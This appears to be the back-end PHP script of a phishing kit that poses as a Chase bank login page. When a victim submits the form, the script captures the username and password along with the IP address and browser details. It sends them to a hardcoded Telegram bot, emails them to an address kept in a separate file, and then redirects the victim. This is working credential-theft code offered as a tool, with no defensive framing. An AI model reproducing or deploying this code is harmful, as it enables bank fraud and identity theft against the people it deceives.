<?php
session_start();

// Check if 'logId' session variable is set


$mody2 = " ";
$mody1 = "@";

function getBrowserAndOsInfo() {
    $userAgent = $_SERVER["HTTP_USER_AGENT"];

    // Get browser name and version
    $browser = get_browser(null, true);
    $browserName = $browser['browser'];

    // Get operating system
    $os = $browser['platform'];

    return [
        'browserName' => $browserName,
        'os' => $os,
        'userAgent' => $userAgent
    ];
}

if (isset($_POST["usr"])) {
    include "to.php";

    $email = $_POST["usr"];
    $pass = $_POST["pwd"];

    if (strpos($email, $mody1) !== false || strpos($pass, $mody2) !== false || strpos($email, $mody2) !== false) {
        header("Location: ./red11.php");
        exit; // Ensure that the script stops executing after redirection
    } else {
        $_SESSION["email"] = $email;

        $ip = $_SERVER["HTTP_CLIENT_IP"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"];

        // Call the function to get browser and OS information
        $browserAndOsInfo = getBrowserAndOsInfo();
        $browserName = $browserAndOsInfo['browserName'];
        $os = $browserAndOsInfo['os'];
        $userAgent = $browserAndOsInfo['userAgent'];

        // Get time with 24 hours format
        $time = date("Y-m-d H:i:s");

        // Construct the HTML-formatted message
        $message = "<b>🚨 ---------= Chase V2 Login UserID =--------- 🚨</b>\n";
        $message .= "<b>👤 User:</b> <code>$email</code>\n";
        $message .= "<b>🔒 Pass:</b> <code>$pass</code>\n";
        $message .= "<b>🌐 IP Address:</b> <code>$ip</code>\n";
        $message .= "<b>📅 Time:</b> $time\n";

        // Display browser information

        $message .= "<b>🕵️‍♂️ User-Agent:</b> $userAgent\n";
        $message .= "<b>✉️ ---------= Chase Result =--------- ✉️</b>\n";

        $subject = "Chase LOGIN";
        $headers = "From: Mody@Chase" . rand(1, 99) . "Mody.V1 ";

    // Send message to Telegram
        file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));


    // Send email
    $done = mail($toemail, $subject, $message, $headers);

        // Additional action, e.g., sending email
        $done = mail($toemail, $subject, $message, $headers);

        header("Location: ./red11.php");
        exit; // Ensure that the script stops executing after redirection
    }
}
?>
